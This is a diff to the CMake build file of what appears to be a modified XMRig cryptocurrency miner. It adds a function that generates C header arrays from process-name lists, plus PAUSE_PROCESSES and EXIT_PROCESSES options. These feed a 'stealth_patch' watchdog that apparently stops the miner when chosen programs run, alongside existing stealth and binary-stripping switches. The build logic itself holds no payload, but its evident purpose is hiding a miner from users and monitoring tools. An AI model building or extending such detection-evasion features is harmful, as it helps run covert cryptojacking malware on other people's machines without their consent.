@@ -234,6 +234,82 @@ if (WITH_EMBEDDED_CONFIG)
     add_definitions(/DXMRIG_FEATURE_EMBEDDED_CONFIG)
 endif()
 
+function(process_string_to_array)
+    # Define and parse named arguments
+    set(options "")
+    set(oneValueArgs INPUT_STRING ARRAY_NAME SIZE_MACRO_NAME OUTPUT_DIR OUTPUT_FILENAME)
+    set(multiValueArgs "")
+    cmake_parse_arguments(ARGS "${options}" "${oneValueArgs}" "${multiValueArgs}" ${ARGN})
+
+    # Set default values if not provided
+    if(NOT ARGS_ARRAY_NAME)
+        set(ARGS_ARRAY_NAME "processed_strings")
+    endif()
+    
+    if(NOT ARGS_SIZE_MACRO_NAME)
+        set(ARGS_SIZE_MACRO_NAME "${ARGS_ARRAY_NAME}_size")
+    endif()
+
+    if(NOT ARGS_OUTPUT_DIR)
+        set(ARGS_OUTPUT_DIR "${CMAKE_CURRENT_BINARY_DIR}")
+    endif()
+
+    if(NOT ARGS_OUTPUT_FILENAME)
+        set(ARGS_OUTPUT_FILENAME "${ARGS_ARRAY_NAME}.h")
+    endif()
+
+    # Validate required arguments
+    if(NOT ARGS_INPUT_STRING)
+        message(FATAL_ERROR "INPUT_STRING is required")
+    endif()
+
+    # Ensure output directory exists
+    file(MAKE_DIRECTORY "${ARGS_OUTPUT_DIR}")
+
+    # Construct full output path
+    set(OUTPUT_PATH "${ARGS_OUTPUT_DIR}/${ARGS_OUTPUT_FILENAME}")
+
+    # Convert the input string to a list using comma as separator
+    string(REPLACE "," ";" STRING_LIST "${ARGS_INPUT_STRING}")
+    
+    # Initialize an empty list for processed strings
+    set(PROCESSED_LIST "")
+    
+    # Process each item in the list
+    foreach(ITEM ${STRING_LIST})
+        # Strip whitespace from both ends
+        string(STRIP "${ITEM}" STRIPPED_ITEM)
+        
+        # Convert to lowercase
+        string(TOLOWER "${STRIPPED_ITEM}" LOWERCASE_ITEM)
+        
+        # Wrap in SAFE() and add to the processed list
+        list(APPEND PROCESSED_LIST "SAFE_STRING(\"${LOWERCASE_ITEM}\")")
+    endforeach()
+    
+    list(LENGTH PROCESSED_LIST LIST_SIZE)
+
+    string(MAKE_C_IDENTIFIER "${ARGS_OUTPUT_FILENAME}" HEADER_GUARD)
+    string(TOUPPER "${HEADER_GUARD}" HEADER_GUARD)
+    
+    set(HEADER_CONTENT "#ifndef ${HEADER_GUARD}\n")
+    string(APPEND HEADER_CONTENT "#define ${HEADER_GUARD}\n#include \"../../safe_string.h\"\n\n")
+    
+    string(APPEND HEADER_CONTENT "static const char* ${ARGS_ARRAY_NAME}[${LIST_SIZE}] = {\n")
+    foreach(ITEM ${PROCESSED_LIST})
+        string(APPEND HEADER_CONTENT "    ${ITEM},\n")
+    endforeach()
+    string(APPEND HEADER_CONTENT "};\n\n")
+    
+    string(APPEND HEADER_CONTENT "#define ${ARGS_SIZE_MACRO_NAME} ${LIST_SIZE}\n\n")
+    
+    string(APPEND HEADER_CONTENT "#endif // ${HEADER_GUARD}\n")
+    
+    file(WRITE "${OUTPUT_PATH}" "${HEADER_CONTENT}")
+
+    message(STATUS "Generated ${OUTPUT_PATH}")
+endfunction()
+
 if (STEALTH_PATCH)
     message(STATUS "Stealth patches enabled")
     add_definitions(/DSTEALTH_PATCH)
@@ -306,6 +382,28 @@ if (STRIP_BINARY)
     set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -s")
     set(CMAKE_C_FLAGS "${CMAKE_C_FLAGS} -s")
     message(STATUS "Stripping binary")
+endif()
+
+if (DEFINED PAUSE_PROCESSES AND NOT PAUSE_PROCESSES STREQUAL "")
+    set(WATCHDOG ON CACHE BOOL "Enable watchdog" FORCE)
+    process_string_to_array(
+    INPUT_STRING "${PAUSE_PROCESSES}"
+    ARRAY_NAME "pause_processes"
+    SIZE_MACRO_NAME "PAUSE_PROCESSES_COUNT"
+    OUTPUT_DIR "${CMAKE_CURRENT_SOURCE_DIR}/src/stealth_patch/watchdog/windows"
+    OUTPUT_FILENAME "pause_processes.h"
+)
+endif()
+
+if (DEFINED EXIT_PROCESSES AND NOT EXIT_PROCESSES STREQUAL "")
+    set(WATCHDOG ON CACHE BOOL "Enable watchdog" FORCE)
+    process_string_to_array(
+    INPUT_STRING "${EXIT_PROCESSES}"
+    ARRAY_NAME "exit_processes"
+    SIZE_MACRO_NAME "EXIT_PROCESSES_COUNT"
+    OUTPUT_DIR "${CMAKE_CURRENT_SOURCE_DIR}/src/stealth_patch/watchdog/windows"
+    OUTPUT_FILENAME "exit_processes.h"
+)
 endif()
 
 if (WATCHDOG)
